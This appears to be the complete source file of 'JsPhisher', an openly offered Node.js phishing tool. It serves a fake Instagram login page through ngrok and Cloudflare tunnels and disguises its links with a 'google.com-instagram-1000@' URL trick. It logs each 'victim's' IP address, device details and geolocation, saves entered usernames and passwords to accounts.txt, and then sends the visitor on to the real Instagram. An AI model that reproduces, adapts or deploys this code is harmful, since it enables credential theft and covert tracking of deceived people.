/**
 * JsPhisher - Easy phishing tool
 * Coded by: @gamerboytr
 * Its a open-source project
 */

"use strict";
try {
	require("express");
} catch (e) {
	console.clear();
	if (e.code !== "MODULE_NOT_FOUND") throw e;
	console.log("You don't have node_modules installed.");
	console.log("Installing dependencies...");
	require("child_process").execSync("npm install");
	console.log("Installed all dependencies.");
}
const express = require("express");
const bodyParser = require("body-parser");
const readlineSync = require("readline-sync");
const geoip = require("geoip-lite");
const chalk = require("chalk");
const agentParser = require("ua-parser-js");
const child_process = require("child_process");
const downloader = require("download");
const AdmZip = require("adm-zip");
const axios = require("axios").default;
const app = express();
const port = process.env.PORT || process.env.NODE_PORT || 6969;
const ngrok = require("ngrok");
const short = require("./short");
const path = require("path");
const fs = require("fs");

const VERSION = "1.1";
const isLinux = process.platform === "linux";
const logAsk = chalk.greenBright`[{whiteBright ?}]`;
const logSuccess = chalk.yellowBright`[{whiteBright √}]`;
const logError = chalk.redBright`[{whiteBright !}]`;
const logInfo = chalk.yellowBright`[{whiteBright +}]`;
const logInfo2 = chalk.greenBright`[{whiteBright •}]`;
const botDetecter = /(Discordbot|bitlybot|facebookexternalhit)/gi;

const logLogo =
	chalk.red`       _     _____  _     _     _               \n` +
	chalk.cyan`      | |   |  __ \\| |   (_)   | |              \n` +
	chalk.yellow`      | |___| |__) | |__  _ ___| |__   ___ _ __ \n` +
	chalk.blue`  _   | / __|  ___/| '_ \\| / __| '_ \\ / _ \\ '__|\n` +
	chalk.red` | |__| \\__ \\ |    | | | | \\__ \\ | | |  __/ |   \n` +
	chalk.yellow`  \\____/|___/_|    |_| |_|_|___/_| |_|\\___|_|\n` +
	chalk.cyan`				       [v${VERSION}]	  \n` +
	chalk.red`			      [By GamerboyTR]	  \n`;

console.clear();
console.log(logLogo);
const loggedIps = [];
if (process.platform === "darwin") {
	console.log(chalk.redBright`${logError} You are running on a Mac. This is not supported.`);
	process.exit(1);
}

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, "util", "instagram")));

(async () => {
	await controlVersion();
	await installRequirements();
	console.log(chalk.magenta`${logInfo2} Initializing local server at localhost:${port}...\n`);
	await new Promise(r =>
		app.listen(port, _ => {
			console.log(chalk.cyan`${logInfo} Local server has started successfully!\n`);
			r();
		})
	);
	console.log(chalk.magenta`${logInfo2} Initializing tunnelers at same address...\n`);
	const ngrokSw = await ngrok.connect(port).catch(console.error);
	const shortNgrok = await short(ngrokSw).catch(console.error);
	const cloudflared = child_process.spawn("util/cloudflared", ["tunnel", "--url", `http://localhost:${port}`]);
	let cfUrl;
	let cfShowed = false;
	let cfReady = false;
	cloudflared.stderr.on("data", async data => {
		if (data.toString().match(/https:\/\/(.*)\.trycloudflare\.com/)) cfUrl = data.toString().match(/https:\/\/(.*)\.trycloudflare\.com/);
		cfReady = !!data.toString().match(/Connection (.*) registered/);
		if (cfReady && !cfShowed) {
			cfShowed = true;
			const shortCf = await short(cfUrl[0]).catch(console.error);
			console.log(chalk.greenBright`${logSuccess} Your urls are given below:\n`);
			console.log(chalk.magenta`${logInfo2} URL 1 > {yellowBright ${cfUrl[0]}}\n`);
			console.log(chalk.magenta`${logInfo2} URL 2 > {yellowBright ${shortCf.split("/")[0] + "//google.com-instagram-1000@" + shortCf.split("/").slice(2).join("/")}}\n\n`);
			console.log(chalk.greenBright`${logSuccess} Your urls are given below:\n`);
			console.log(chalk.magenta`${logInfo2} URL 3 > {yellowBright ${ngrokSw}}\n`);
			console.log(chalk.magenta`${logInfo2} URL 4 > {yellowBright ${shortNgrok.split("/")[0] + "//google.com-instagram-1000@" + shortNgrok.split("/").slice(2).join("/")}}\n`);
			console.log(chalk.cyan`${logInfo} Waiting for ip info... {cyanBright Press {red Ctrl+C} to exit}`);
		}
	});
})();

app.all("/", async (req, res) => {
	const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
	const userAgent = req.headers["user-agent"];
	const ua = agentParser(userAgent);
	const referer = req.headers?.referer;
	const location = geoip.lookup(ip);
	const { data: request } = await axios.get(`https://ipwhois.app/json/${ip}`).catch(console.error);
	res.redirect("login");
	if (ip !== "::1" && !botDetecter.test(userAgent) && !loggedIps.includes(ip) && request.type && location?.city) {
		console.clear();
		console.log(logLogo);
		console.log(chalk.greenBright`${logSuccess} Victim IP found!\n`);

		console.log(chalk.yellow`${chalk.cyan`[{cyanBright *}]`} IP                   :  ${ip}`);
		console.log(chalk.yellow`${chalk.cyan`[{cyanBright *}]`} IP Type              :  ${request.type}`);
		console.log(chalk.yellow`${chalk.cyan`[{cyanBright *}]`} User OS              :  ${ua.os?.name ? `${ua.os.name} ${ua.os.version}` : "Unknown"}`);
		console.log(chalk.yellow`${chalk.cyan`[{cyanBright *}]`} Browser              :  ${ua.browser.name ?? "Unknown"}`);
		console.log(chalk.yellow`${chalk.cyan`[{cyanBright *}]`} Version              :  ${ua.browser.version ?? "Unknown"}`);
		console.log(chalk.yellow`${chalk.cyan`[{cyanBright *}]`} Location             :  ${request?.city ?? "Unknown"}`);
		console.log(chalk.yellow`${chalk.cyan`[{cyanBright *}]`} GeoLocation(lat, lon):  ${location.ll.join(", ")}`);
		console.log(chalk.yellow`${chalk.cyan`[{cyanBright *}]`} Curreny              :  ${request.currency_code}`);
		console.log(chalk.yellow`${chalk.cyan`[{cyanBright *}]`} Referer              :  ${referer ?? "No referer"}`);
		console.log(chalk.yellow`${chalk.cyan`[{cyanBright *}]`} UserAgent            :  ${userAgent ?? "No agent"}\n`);

		loggedIps.push(ip);
		fs.appendFileSync("./ip.txt", `${ip} - ${ua.os?.name ? `${ua.os.name} ${ua.os.version}` : "Unknown"} - ${ua.browser.name ?? "Unknown"}${" " + ua.browser.version ?? ""} - ${location?.city ?? "Unknown"} - ${location.ll.join(", ")} - ${referer ?? "No referer"}\n`);
		console.log(chalk.cyan`${logInfo} Saved in ip.txt\n`);
		console.log(chalk.cyan`${logInfo} Waiting for next... {cyanBright Press {red Ctrl+C} to exit}`);
	}
});

app.get("/login", (req, res) => {
	res.sendFile(path.join(__dirname, "util", "instagram", "login.html"));
});

app.post("/login", (req, res) => {
	const { username, password } = req.body;
	res.redirect("https://instagram.com");
	if (!username?.trim?.() || !password?.trim?.()) return;
	console.log(chalk.greenBright`${logSuccess} Victim login info found!\n`);

	console.log(chalk.yellow`${chalk.cyan`[{cyanBright *}]`} Instagram Username:  ${username}`);
	console.log(chalk.yellow`${chalk.cyan`[{cyanBright *}]`} Instagram Password:  ${password}\n`);

	fs.appendFileSync("./accounts.txt", `${username}:${password}\n`);
	console.log(chalk.cyan`${logInfo} Saved in accounts.txt\n`);
	console.log(chalk.cyan`${logInfo} Waiting for next... {cyanBright Press {red Ctrl+C} to exit}`);
});

//! Functions

function controlVersion() {
	return new Promise(async (resolve, reject) => {
		const { data: readme } = await axios.get("https://raw.githubusercontent.com/gamerboytr/JsPhisher/master/README.md").catch(reject);
		const version = readme.match(/Version-(.*?)-green/)[1];
		const changelogRequest = await axios.get(`https://raw.githubusercontent.com/gamerboytr/JsPhisher/master/CHANGELOG.md`).catch(() => {});
		const changelog = changelogRequest?.data;
		if (version !== VERSION) {
			console.clear();
			console.log(logLogo);
			console.log(chalk.redBright`${logError} New version available!\n`);
			console.log(chalk.yellow`${chalk.cyan`[{cyanBright *}]`} Current version:  ${VERSION}`);
			console.log(chalk.yellow`${chalk.cyan`[{cyanBright *}]`} New version:      ${version}\n`);
			console.log(chalk.yellow`${logAsk} Do you want to update? {yellowBright (y/n)}`);
			if (readlineSync.keyInYN("")) {
				console.clear();
				console.log(logLogo);
				console.log(chalk.greenBright`${logSuccess} Updating...\n`);
				console.log(chalk.yellow`${logInfo} Downloading repo...`);
				child_process.execSync(`cd .. && ${isLinux ? "rm -rf JsPhisher" : "rmdir /S /Q JsPhisher"} && git clone https://github.com/gamerboytr/JsPhisher`);
				console.log(chalk.yellow`${logInfo} Updated!\n`);
				console.log(chalk.yellow`${logInfo} Please restart terminal manually.\n`);
				if (changelog) {
					console.log(chalk.yellow`${logInfo} Changelog:\n`);
					console.log(chalk.yellow(changelog));
				}
				process.exit();
			} else {
				console.clear();
				console.log(logLogo);
				console.log(chalk.greenBright`${logSuccess} Using old version.\n`);
			}
		}
		resolve();
	});
}

function installRequirements() {
	return new Promise(async (resolve, reject) => {
		console.clear();
		console.log(logLogo);
		if (!fs.existsSync(path.join(__dirname, "util", `cloudflared${isLinux ? ".deb" : ".exe"}`))) {
			console.log(chalk.yellow`${logInfo2} Downloading cloudflared...`);
			let cloudflaredLink = `https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-${isLinux ? "linux" : "windows"}-`;
			cloudflaredLink += isLinux && process.arch === "x64" ? "amd64.deb" : isLinux ? "386.deb" : "386.exe";
			await downloader(cloudflaredLink, path.join(__dirname, "util"), { filename: `cloudflared${isLinux ? ".deb" : ".exe"}` }).catch(reject);
			console.log(chalk.yellow`${logSuccess} Downloaded!\n`);
		}
		if (fs.existsSync(path.join(__dirname, "util", "instagram.zip"))) {
			console.log(chalk.yellow`${logInfo2} Extracting instagram...`);
			new AdmZip(path.join(__dirname, "util", "instagram.zip")).extractAllTo(path.join(__dirname, "util", "instagram"), true);
			console.log(chalk.yellow`${logSuccess} Extracted!\n`);
			console.log(chalk.yellow`${logInfo2} Removing instagram.zip...`);
			fs.unlinkSync(path.join(__dirname, "util", "instagram.zip"));
			console.log(chalk.yellow`${logSuccess} Removed!\n`);
		}
		resolve();
	});
}
